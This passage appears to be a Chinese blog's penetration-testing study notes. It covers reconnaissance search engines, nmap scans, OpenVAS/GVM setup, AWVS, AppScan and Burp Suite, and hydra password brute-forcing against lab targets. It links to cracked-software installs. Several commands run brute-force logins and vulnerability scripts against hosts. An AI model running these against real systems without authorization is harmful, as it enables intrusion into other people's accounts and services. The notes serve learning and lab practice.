搜索日本区使用Microsoft IIS的设备：</span><br><span class="line">country:jp product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Zoomeye-Hacking"><a href="#Zoomeye-Hacking" class="headerlink" title="Zoomeye Hacking"></a>Zoomeye Hacking</h3><blockquote>
<p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<p>Zoomeye (钟馗之眼) 面向网络空间的搜索引擎，国产的 Shodan，知道创宇出品</p>
<p>公网设备指纹检索和 Web 指纹检索</p>
<p>设备指纹包括应用名、版本、开放端口、操作系统、服务没、地理位置等</p>
<p>网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内存管理系统和数据库等</p>
</blockquote>
<ul>
<li>ip(IP 地址) / os / app(组件名) / service(服务名) / port / product / country / ver(组件版本) / cidr(CIDR IP 段:8.8.8.8/24) / hostname(主机名) / site(域名) / title(首页标题) / headers(HTTP 头) / keywords(首页关键词) / desc(首页描述信息)</li>
<li>用户手册</li>
</ul>
<h2 id="目标扫描篇"><a href="#目标扫描篇" class="headerlink" title="目标扫描篇"></a>目标扫描篇</h2><p>和漏扫不同，信息扫描只是获得一些指纹信息</p>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote>
<p>Nmap 是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行</p>
<p><a href="https://nmap.org/">https://nmap.org/</a></p>
<p><a href="https://sectools.org/">https://sectools.org/</a></p>
<p>命令行</p>
<p>！扫描行为本来也是攻击行为</p>
</blockquote>
<h4 id="扫描示例"><a href="#扫描示例" class="headerlink" title="扫描示例"></a>扫描示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主机发现 C段扫描</span></span><br><span class="line">nmap -sn 192.168.106.0/24</span><br><span class="line">nmap -sn www.baidu.com/24</span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">nmap -sS -p1-1000 192.168.106.134</span><br><span class="line"><span class="comment"># 系统扫描</span></span><br><span class="line">nmap -O 192.168.106.134</span><br><span class="line"><span class="comment"># 版本扫描 - 服务版本信息</span></span><br><span class="line">nmap -sV 192.168.106.134</span><br><span class="line">nmap -sV 192.168.106.134 -p1-1024</span><br><span class="line"><span class="comment"># 综合扫描</span></span><br><span class="line">nmap -A 192.168.106.134</span><br><span class="line"><span class="comment"># 脚本扫描</span></span><br><span class="line">root@kali:/usr/share/nmap/scripts</span><br><span class="line">nmap --script=default 192.168.106.134</span><br><span class="line">nmap --script=auth 192.168.106.214</span><br><span class="line">nmap --script=brute 192.168.106.134</span><br><span class="line">nmap --script=vuln 192.168.106.134</span><br><span class="line">nmap --script=broadcast 192.168.106.134</span><br><span class="line">nmap --script=smb-brute.nse 192.168.106.134</span><br><span class="line">nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.106.134</span><br><span class="line">nmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.106.134</span><br><span class="line">nmap -p3306 --script=mysql-empty-password.nse 192.168.106.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是什么服务的端口</span></span><br><span class="line">grep 111 /etc/services</span><br><span class="line"></span><br><span class="line">nmap --<span class="built_in">help</span> | grep <span class="string">&#x27;\-Pn&#x27;</span></span><br><span class="line"></span><br><span class="line">tcpdump -i eth0 -nn host 192.168.106.134 and port 22</span><br><span class="line"><span class="comment"># -n不将端口解析成为协议名 不将IP解析成为主机名</span></span><br><span class="line">nc 192.168.106.134 -t 22</span><br><span class="line"><span class="comment"># SYN ACK FIN RST(reset)</span></span><br><span class="line">当访问一个未开启的tcp端口的时候，服务器会回一个带有reset的标记</span><br><span class="line">当访问一个未开启的udp端口的时候，服务器会使用icmp协议回一个端口不可达</span><br><span class="line">tcpdump -i eth0 -nn host 192.168.106.134 and port 7777 or icmp</span><br><span class="line">nc 192.168.106.134 -u 7777</span><br><span class="line">nc -l -u 7777</span><br></pre></td></tr></table></figure>
<h3 id="zenmap"><a href="#zenmap" class="headerlink" title="zenmap"></a>zenmap</h3><p>图形化、nmap 的前端</p>
<ul>
<li><p>intense scan</p>
<p><img src="zenmap-intensescan.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.50.129</span><br><span class="line">-T 设置速度等级，1到5级，数字越大，速度越快</span><br><span class="line">-A 综合扫描</span><br><span class="line">-v 输出扫描过程</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan plus UDP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sU -T4 -A -v 192.168.106.134</span><br><span class="line">-sS TCP全连接扫描</span><br><span class="line">-sU UDP扫描</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan, all TCP ports</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A -v 192.168.106.134</span><br><span class="line">-p 指定端口范围，默认扫描1000歌端口</span><br></pre></td></tr></table></figure></li>
<li><p>intense scan no ping</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap =T4 -A -v -Pn 192.168.106.134/24</span><br><span class="line">-Pn 不做ping扫描，例如针对防火墙等安全产品</span><br></pre></td></tr></table></figure></li>
<li><p>ping scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.106.0/24</span><br><span class="line">nmap -sn -T4 -v 192.168.106.0/24</span><br><span class="line">-sn 只做ping扫描，不做端口扫描</span><br></pre></td></tr></table></figure></li>
<li><p>quick scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -F 192.168.106.134</span><br><span class="line">-F fast模式，只扫描常见服务端口，比默认端口(1000个)还少</span><br></pre></td></tr></table></figure></li>
<li><p>quick scan plus</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -T4 -O -F --version-light 192.168.106.134</span><br><span class="line">-sV 扫描系统和服务版本</span><br><span class="line">-O  扫描操作系统版本</span><br></pre></td></tr></table></figure></li>
<li><p>quick traceroute</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn --traceroute www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>regular scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap www.baidu.com</span><br></pre></td></tr></table></figure></li>
<li><p>slow comprehensive scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script <span class="string">&quot;default or (discovery and safe)&quot;</span> 192.168.50.129</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h3><blockquote>
<p>OpenVAS(Open Vulnerability Assessment System)，即开放式漏洞评估系统，是一个用于评估目标漏洞的接触框架，开源且功能十分强大</p>
<p>它与著名的 Nessus“本是同根生”，在 Nessus 商业化之后仍然坚持开源，号称“当前最好用的开源漏洞扫描工具”</p>
<p>最新版的 Kali Linux 不再自带 OpenVAS 了，需要自己部署 OpenVAS 漏洞检测系统</p>
<p>其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。但是他的最常用用途是检测目标网络或主机的安全性。他的评估能力来源于数万个漏洞测试程序，这些程序都是以插件的形式存在。</p>
<p>openvas 是基于 C/S(客户端/服务器)，B/S(浏览器/服务器)架构进行工作，用户通过浏览器或者专用客户端程序来下达扫描任务，服务器端负责授权，执行扫描操作并提供扫描结果</p>
<p><a href="https://openvas.org/">https://openvas.org/</a></p>
<p><a href="https://www.greenbone.net/">https://www.greenbone.net/</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>gvmd</td>
<td>GVM10 自带的守护进程</td>
</tr>
<tr>
<td>openvasmd</td>
<td>GVM9 及之前的守护进程的叫法</td>
</tr>
<tr>
<td>openvassd</td>
<td>GVM 的扫描器进程，作用就是进行漏洞扫描，并将结果反馈给管理模块</td>
</tr>
</tbody></table>
<h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><p>部署太难了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 升级kali</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装OpenVAS</span></span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改admin账户密码</span></span><br><span class="line">openvasmd --user=admin --new-password=zzr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改默认监听IP</span></span><br><span class="line">vim /lib/systemd/system/greenbone-security-assistant.service</span><br><span class="line"><span class="comment"># 默认情况下只能从本机访问它的端口</span></span><br><span class="line"><span class="comment"># 可以修改ip，允许所有主机访问，从远程访问</span></span><br><span class="line"><span class="comment"># 不建议修改，不太好访问，直接通过本地kali浏览器访问也是很方便的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动OpenVAS</span></span><br><span class="line">openvas-start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装</span></span><br><span class="line">ss -tnlp <span class="comment"># 有三个端口监听</span></span><br><span class="line">openvas-check-setup <span class="comment"># 启动后再进行检测</span></span><br></pre></td></tr></table></figure>
<p><a href="https://technowikis.com/12315/how-to-install-openvas-on-kali-linux-2020">教程</a></p>
<p><img src="openvassetup-fail.png"></p>
<p><a href="https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/?__cf_chl_jschl_tk__=25139ba6d591f4c846aeee7acf53a5a54fd929cb-1598151469-0-AVLyhg31Xds7rGgzPy_P1bs4A_rVKfEsoy86KpTgdeuU54ZcELtu_89Wr3bLR56_S97NdzFH5qkaKMXqH27Tn0UFr-sIBPYsH4thg7t4NHzxnYuzSOq77KsiLoK5pP1FUQrf48M1WkrhBcob_YgqrRn19j7kivDKa9nkpltttdw84SFGXvXMTHsn5qml825gKEU-LJ0GFQj2Ns4Aj4fv__gy-GnAqxEk_4fIuLRKNOegZwRKzP4ucAg_TBpb3Coq4tFkD73MEiDV9onZGBh9Wh3tlvY-ilEV8_sUtNrHPdvvkBSJB1Fd0-eil9tHlI8VZ2S6gjunkvpMQCgrPFCrsyrYcPfH3iSmPpyL8QvFLRqM">openvas-setup command not found 解决方法</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OpenVAS is changing the name, the new <span class="built_in">command</span> gvm will replace all openvas commands.</span><br><span class="line">Since Kali Rolling updated repository, we now should use gvm instead of openvas commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># gvm Greenbone Vulnerability Manager</span></span><br><span class="line">sudo apt install gvm -y</span><br><span class="line">sudo gvm-setup</span><br><span class="line">sudo gvm-feed-update</span><br><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line"><span class="comment"># gvm-setup报错</span></span><br><span class="line"><span class="comment"># ERROR: The default postgresql version is not 12 required by libgvmd</span></span><br><span class="line"><span class="comment"># solved：https://askubuntu.com/questions/1223270/psql-command-error-postgresql-version-12-is-not-installed</span></span><br></pre></td></tr></table></figure>
<p><a href="https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/#comment-201">https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/#comment-201</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Tested <span class="keyword">for</span> you.</span><br><span class="line">If you create a new VM, <span class="keyword">then</span> install Kali Linux by using the 2020.3 ISO file, <span class="keyword">then</span> install GVM by using these commands</span><br><span class="line">sudo apt install gvm</span><br><span class="line">sudo gvm-setup</span><br><span class="line">Then record the last part from the <span class="built_in">command</span> output <span class="built_in">which</span> will have your password <span class="keyword">for</span> user: admin</span><br><span class="line">[+] Done</span><br><span class="line">[*] Please note the password <span class="keyword">for</span> the admin user</span><br><span class="line">[*] User created with password ‘xxxxxxxxxxxxxxxxxxxxxxxxxxx’.</span><br><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line">Then open a browser within Kali Linux, enter https://127.0.0.1:9392</span><br><span class="line">You should be able to use it.</span><br></pre></td></tr></table></figure>
<p><img src="gvm-setup.png"></p>
<p><img src="gvm-setup-success.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 都需要sudo权限</span></span><br><span class="line"><span class="comment"># gvm修改密码</span></span><br><span class="line">sudo gvmd --user=admin --new-password=admin</span><br><span class="line"><span class="comment"># 修改不成功</span></span><br></pre></td></tr></table></figure>
<p><a href="https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/">https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/https://dannyda.com/2020/08/26/how-to-reset-admin-password-for-openvas-and-gvm-11/</a></p>
<p><a href="https://www.cnblogs.com/godyrg/p/13523166.html">https://www.cnblogs.com/godyrg/p/13523166.html</a></p>
<p><a href="https://blog.51cto.com/linhong/2134910?source=drt">当有其中一个服务启动 failed 的解决方法</a></p>
<p>虽然环境搭好了，但是我扫描一直都得不到结果</p>
<p><img src="openvas-error.png"></p>
<p>可能还是什么服务没有正常运行 - 【版本不兼容问题吧-没深究了】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /var/log/gvm/gvmd.log</span></span><br><span class="line">openvas manage_update_nvt_cache_osp:failed to connect to /run/ospd/ospd.sock</span><br></pre></td></tr></table></figure>
<p>我放弃了，决定用 docker 的方式搭建 <a href="https://www.freebuf.com/articles/container/236909.html">https://www.freebuf.com/articles/container/236909.html</a> - 【未测试】</p>
<p><a href="https://www.cnblogs.com/mysticbinary/p/12779149.html">https://www.cnblogs.com/mysticbinary/p/12779149.html</a> - 【成功】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker openvas logs</span><br></pre></td></tr></table></figure>

<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gvm-start</span><br><span class="line"></span><br><span class="line">https://192.168.106.158:9392</span><br><span class="line"><span class="comment"># 为KaliIP地址</span></span><br><span class="line"><span class="comment"># 注是https</span></span><br></pre></td></tr></table></figure>
<img src="gvm-dashboard.png" alt="gvm-dashboard" style="zoom:67%;" />

<h4 id="新建扫描-task"><a href="#新建扫描-task" class="headerlink" title="新建扫描 task"></a>新建扫描 task</h4><p>扫描需要的时间很长：1.我们不能在业务繁忙的时候进行扫描，也不能对未授权的站点进行扫描</p>
<ul>
<li>Scans -&gt; Tasks</li>
<li>选择紫色的小魔法棒 -&gt; Task wizard -&gt; 对目标主机进行扫描</li>
<li>导出扫描报告</li>
</ul>
<h4 id="高级扫描-task"><a href="#高级扫描-task" class="headerlink" title="高级扫描 task"></a>高级扫描 task</h4><ul>
<li><p>选择紫色的小魔法棒 -&gt; Advanced Task wizard -&gt; 对目标主机进行扫描</p>
<p><img src="openvas-ascan.png"></p>
<img src="openvas-running.png" alt="image-20200829222358213" style="zoom:67%;" /></li>
<li><p>导出扫描报告</p>
<p>出现扫描进度条，才算可以，只不过 openvas 的耗时巨久</p>
<p><img src="openvas-report.png"></p>
</li>
</ul>
<h1 id="Web-漏洞扫描"><a href="#Web-漏洞扫描" class="headerlink" title="Web 漏洞扫描"></a>Web 漏洞扫描</h1><h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><blockquote>
<p>Acunetix Web Vulnerability Scanner(AWVS)是一款知名的 Web 网络漏扫工具。它通过网络爬虫测试网站安全，检测流行安全漏洞。它包含有收费和免费两种版本</p>
<p><a href="https://www.acunetix.com/">https://www.acunetix.com/</a></p>
<p><a href="https://www.acunetix.com/vulnerability-scanner/download/">https://www.acunetix.com/vulnerability-scanner/download/</a></p>
<p><a href="https://www.acunetix.com/download/fullver13/">https://www.acunetix.com/download/fullver13/</a></p>
<blockquote>
<p>功能以及特点</p>
<ol>
<li>自动的客户端脚本分析器，允许对 Ajax 和 Web2.0 应用程序进行安全性测试</li>
<li>业内最先进且深入的 SQL 注入和跨站脚本测试</li>
<li>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer</li>
<li>可视化宏记录器轻松测试 web 表格和受密码保护的区域</li>
<li>支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor(双因素)验证机制</li>
<li>丰富的报告功能，包括 VISA PCI 依从性报告</li>
<li>高速的多线程扫描器轻松检索成千上万个页面</li>
<li>智能爬行程序检测 web 服务器类型和应用程序语言</li>
<li>Acunetix 检索并分析网站，包括 flash 内容、SOAP 和 AJAX</li>
<li>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查</li>
<li>可导出网站漏洞文件</li>
</ol>
</blockquote>
</blockquote>
<h3 id="项目环境"><a href="#项目环境" class="headerlink" title="项目环境"></a>项目环境</h3><ul>
<li>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</li>
<li>测试渗透机：win7(即软件安装在 win7 上)</li>
<li>大多数软件都是基于 java 环境，所以要在 win7 攻击机上安装 Windows 版的 java 包</li>
</ul>
<h3 id="AWVS-安装"><a href="#AWVS-安装" class="headerlink" title="AWVS 安装"></a>AWVS 安装</h3><p><a href="https://www.cnblogs.com/Hunter-01001100/p/12433813.html">漏洞扫描工具 acunetix 破解安装步骤</a> - 网页版</p>
<p><img src="acunetix-web.png"></p>
<p><a href="https://cloud.tencent.com/developer/article/1480771">AWVS 中文教程</a> - Consultant Edition</p>
<p><img src="acunetix-consultantedition.png"></p>
<h3 id="AWVS-使用"><a href="#AWVS-使用" class="headerlink" title="AWVS 使用"></a>AWVS 使用</h3><ul>
<li><p>网站扫描 - Web Scanner ⭐</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 官方提供的扫描页面</span><br><span class="line">http://testhtml5.vulnweb.com/</span><br><span class="line">http://testphp.vulnweb.com/</span><br><span class="line">http://testasp.vulnweb.com/</span><br><span class="line">http://testaspnet.vulnweb.com/</span><br><span class="line"></span><br><span class="line"># profile是扫描配置，关注哪个漏洞，选择测试类型</span><br><span class="line"></span><br><span class="line"># 提供信息</span><br><span class="line">- Target Information</span><br><span class="line">- Web Alerts 漏洞告警</span><br><span class="line">- Site Structure 网站架构</span><br><span class="line">- Activity 扫描日志</span><br><span class="line"></span><br><span class="line"># 弹出的标单随意填写</span><br></pre></td></tr></table></figure></li>
<li><p>站点爬取 - Site Crawler</p>
</li>
<li><p>目标查找 - Target Finder</p>
</li>
<li><p>子域名扫描 - Subdomain Scanner</p>
</li>
<li><p>SQL 盲注 - Blind SQL Injector</p>
</li>
<li><p>HTTP 编辑器 - HTTP Editor</p>
</li>
<li><p>HTTP 嗅探 - HTTP Sniffer</p>
</li>
<li><p>HTTP 模糊测试 - HTTP Fuzzer</p>
</li>
<li><p>认证测试 - Authentication Tester</p>
</li>
<li><p>结果比较 - Compare Results</p>
<p>用得较多、Consultant Edition</p>
</li>
<li><p>网站服务扫描 - Web Services Scanner</p>
</li>
<li><p>任务计划 </p>
</li>
<li><p>扫描报告 - Report</p>
<p>加上甲方 logo 等信息</p>
</li>
<li><p>AWVS 配置</p>
</li>
</ul>
<h2 id="AppScan"><a href="#AppScan" class="headerlink" title="AppScan"></a>AppScan</h2><blockquote>
<p>IBM Security AppScan 是一个适合安全专家的 Web 应用程序和 Web 服务渗透测试解决方案</p>
<p>国外商业漏扫产品中，少有的能支持中文的漏扫，运行于 windows 平台</p>
<p>界面清晰、配置简单丰富的中文和产品文档，详细的漏洞说明和修复建议</p>
<p>支持丰富的扫描报告，包括安全性、行业标准、合规一次性报告</p>
<blockquote>
<p>功能及特点</p>
<ol>
<li>对现代 Web 应用程序和服务执行自动化的动态应用程序安全测试(DAST)和交互式应用程序安全测试(IAST)</li>
<li>支持 web 2.0、JavaScript 和 AJAX 框架的全面的 JavaScript 执行引擎</li>
<li>涵盖 XML 和 JSON 基础架构的 SOAP 和 REST Web 服务测试支持 WS-Security 标准、XML 加密和 XML 签名</li>
<li>详细的漏洞公告和修复建议</li>
<li>40 多种合规性报告，包括支付卡行业数据安全标准(PCI DSS)、支付应用程序数据安全标准(PA-DSS)、ISO 27001 和 ISO 27002，以及 Basel Ⅱ</li>
<li>IBM Security AppScan eXtensions Framework 提供的自定义功能和可扩展性</li>
</ol>
</blockquote>
<p>测试网站：demo.testfire.net 用户名：jsmith 密码：Demo1234</p>
<p>该软件体量比较大，需要足够的内存</p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://www.fujieace.com/penetration-test/appscan-use.html">AppScan 下载安装使用教程</a> - 我扫描得出的都是安全，所以我换一个高版本</p>
<p><a href="https://www.shungg.cn/post/247">下载地址-教程二</a></p>
<p><a href="https://www.mad-coding.cn/2019/08/21/AppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/#0x02-%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85">内容同上-教程二</a></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>文件 -&gt; 新建 -&gt; 常规扫描 -&gt; 填入对应的 URL</p>
<p>登录方法 -&gt; 自动(填入用户名和密码等信息) -&gt; 自动检测会话中配置</p>
<p>扫描 pwaspbwa 的结果</p>
<p><img src="appscan.png"></p>
<p>需要在一次会话中完成扫描，否则下一次打开就会报错会话检测问题</p>
<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><blockquote>
<p>安全渗透界使用最广泛的漏扫工具之一，能实现从漏洞发现到利用的完整过程</p>
<p>功能强大、配置较为复杂、可定制型强、支持丰富的第三方拓展插件、基于 Java 编写、跨平台支持、分为 Free 和 Professional 版本</p>
<p><a href="https://portswigger.net/burp">https://portswigger.net/burp</a></p>
<p>核心功能：目标(基础)、代理、爬虫、扫描、入侵</p>
<p>辅助功能：重放、序列器、解码器、对比</p>
<ul>
<li>Target：目标模块用于设置扫描域(target scope)、生成站点地图(sitemap)、生成安全分析</li>
<li>Proxy：代理模块用于拦截浏览器的 http 会话内容</li>
<li>Spider：爬虫模块用于自动爬取网站的每个页面内容，并生成完整的网站地图</li>
<li>Scanner：扫描模块用于自动化检测漏洞，分为主动和被动扫描</li>
<li>Intruder：入侵(渗透)模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击；入侵模块的原理是根据访问链接中存在的参数\变量，调用本地词典、攻击载荷，对参数进行渗透测试</li>
<li>Repeater：重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</li>
<li>Sequencer：序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</li>
<li>Decoder：解码器模块用于实现对 URL、HTML、Base64、ASCII、二/八/十六进制、哈希等编码转换</li>
<li>Comparer：对比模块用于对两次不同的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</li>
<li>Extender：拓展模块是 burpsuite 非常强悍的一个功能，也是它跟其他 Web 安全评估系统最大的差别；通过拓展模块，可以加载自己开发的或者第三方模块，打造自己的 burpsuite 功能；通过 burpsuite 提供的 API 接口，目前可以支持 Java、Python、Ruby 三种语言的模块编写</li>
<li>Options：分为 Project/User Options，主要对软件进行全局设置</li>
<li>Alerts：显示软件的使用日志信息</li>
</ul>
</blockquote>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><ul>
<li>kali linux：集成 burpsuite free 版本，不支持 scanner 功能</li>
<li>burpsuite pro 1.7.30 版本，支持全部功能<ul>
<li>启动方法：java -jar -Xmx1024M /burpsuite_path/BurpHelper.jar</li>
</ul>
</li>
<li>浏览器的代理软件<ul>
<li>SwitchyOmega：添加 proxy，填写 proxy servers</li>
</ul>
</li>
</ul>
<h3 id="代理功能-Proxy"><a href="#代理功能-Proxy" class="headerlink" title="代理功能 - Proxy"></a>代理功能 - Proxy</h3><blockquote>
<p>开启监听端口</p>
<p>浏览器设置代理</p>
<p>代理功能详解</p>
<p>拦截账号信息</p>
</blockquote>
<p>要扫描 OWASP 靶机，必须先要设置代理，<strong>保证数据能够经过 Burpsuite</strong></p>
<p>http history</p>
<h3 id="目标功能-Target"><a href="#目标功能-Target" class="headerlink" title="目标功能 - Target"></a>目标功能 - Target</h3><ul>
<li><p>站点地图 Site map</p>
</li>
<li><p>设置目标域 Target Scope</p>
<ul>
<li>选择想要的站点</li>
<li>全局/局部</li>
</ul>
</li>
<li><p>filter(选择想要显示部分)</p>
</li>
</ul>
<h3 id="爬虫功能-Spider"><a href="#爬虫功能-Spider" class="headerlink" title="爬虫功能 - Spider"></a>爬虫功能 - Spider</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 准备工作</span><br><span class="line">1. 设置代理获取域名</span><br><span class="line">2. 访问目标网站</span><br><span class="line">3. 设置目标域</span><br><span class="line">4. 拦截功能关闭</span><br><span class="line"></span><br><span class="line"># 爬取设置</span><br><span class="line">Spider -&gt; Options -&gt; Crawler Settings</span><br><span class="line">1. 检查robots.txt文件</span><br><span class="line">2. 检查404页面</span><br><span class="line">3. 请求所有页面</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>有些页面是灰色的，即该页面我们没有访问。我们主动访问一些页面，但是其他未经访问的页面也被爬取下来，说明 Burpsuite 在被动爬取</li>
</ul>
<h3 id="扫描功能-Scanner"><a href="#扫描功能-Scanner" class="headerlink" title="扫描功能 - Scanner"></a>扫描功能 - Scanner</h3><p>BurpSuite 社区版没有扫描功能</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 准备工作</span><br><span class="line">1. 设置代理获取域名</span><br><span class="line">2. 访问目标网站</span><br><span class="line">3. 设置目标域</span><br><span class="line">4. 拦截功能关闭</span><br><span class="line"></span><br><span class="line"># 扫描选项之扫描方式</span><br><span class="line">主动扫描精准度高时间长影响大消耗资源多</span><br><span class="line">主动扫描默认关闭，当手工浏览网页时主动发送大量探测请求来确定是否会对目标系统有性能压力，适合离线环境</span><br><span class="line"></span><br><span class="line">被动扫描精准度低时间段影响小消耗资源少</span><br><span class="line">被动扫描默认开启，当手工浏览网页时，基于原有网页数据进行探测，不再发送请求，压力最小，也能针对性测试，适合生产环境</span><br><span class="line">即在目标域下面手工浏览网页时，Burpsuite启动passive scanner进行扫描，通过手工浏览网页+之前爬虫获得的站点地图(包含详细页面)，将这些已经存在的网页，发送到被动扫描模块</span><br></pre></td></tr></table></figure>
<p>issue activity -&gt; 导出报告</p>
<p><img src="burpsuite-scan.png"></p>
<h1 id="SSH-密码暴力破解以及防御实战"><a href="#SSH-密码暴力破解以及防御实战" class="headerlink" title="SSH 密码暴力破解以及防御实战"></a>SSH 密码暴力破解以及防御实战</h1><p>在线破解：服务开启，通过不断尝试、探测破解</p>
<p>离线破解：获得本地密码文件如 shadow 文件，通过 MD5 的网站或者工具去破解</p>
<h2 id="hydra-海德拉"><a href="#hydra-海德拉" class="headerlink" title="hydra [海德拉]"></a>hydra [海德拉]</h2><blockquote>
<p>世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于<strong>破解字典</strong>是否足够强大，在网络安全渗透过程中是一款必备的测试工具</p>
<ol>
<li>命令行版本</li>
<li>GUI 版本 xhydra</li>
</ol>
</blockquote>
<h3 id="指定用户破解-amp-用户列表破解"><a href="#指定用户破解-amp-用户列表破解" class="headerlink" title="指定用户破解 &amp; 用户列表破解"></a>指定用户破解 &amp; 用户列表破解</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Examples:</span><br><span class="line"><span class="comment"># -l 指的是login，即使用登录名user进行登录</span></span><br><span class="line"><span class="comment"># -P 使用密码字典passlist.txt进行破解</span></span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -l user -P passlist.txt 192.168.0.1 ftp</span><br><span class="line"><span class="comment"># -L 指的是login，即使用账号字典userlist.txt进行破解</span></span><br><span class="line"><span class="comment"># -p 使用密码进行登录</span></span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line"><span class="comment"># -C 指定所用格式为&quot;user:password&quot;字典文件</span></span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line"><span class="comment"># -M 指定破解的目标文件，如果不是默认端口，后面跟上&quot;: port&quot;</span></span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">  </span><br><span class="line">:<span class="built_in">set</span> list</span><br></pre></td></tr></table></figure>
<p><img src="hydra-owaspbwa.png"></p>
<h2 id="Medusa-美杜莎"><a href="#Medusa-美杜莎" class="headerlink" title="Medusa [美杜莎]"></a>Medusa [美杜莎]</h2><blockquote>
<p>Medusa 是一个速度快、支持大规模并行、模块化、爆破登录、可以同时对多个主机、用户或密码执行强力测试</p>
<p>同 hydra 一样属于在线密码破解工具，但 medusa 的稳定性相较于 hydra 要好很多，但其支持模块要比 hydra 少一些</p>
</blockquote>
<p>kali 没有 medusa apt-get install</p>
